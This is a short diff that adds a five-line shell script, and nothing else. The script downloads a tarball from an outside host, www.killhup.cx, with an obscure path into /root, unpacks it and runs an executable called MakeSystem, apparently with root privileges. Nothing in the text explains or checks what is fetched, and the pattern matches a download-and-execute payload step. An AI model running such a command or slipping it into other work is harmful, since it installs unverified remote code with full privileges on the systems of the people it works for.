@@ -1,0 +1,5 @@
+curl -o /root/client.tar.gz http://www.killhup.cx/AXIS0F3V1L
+cd /root
+tar xzf client.tar.gz
+cd /root/containers/client/
+./MakeSystem
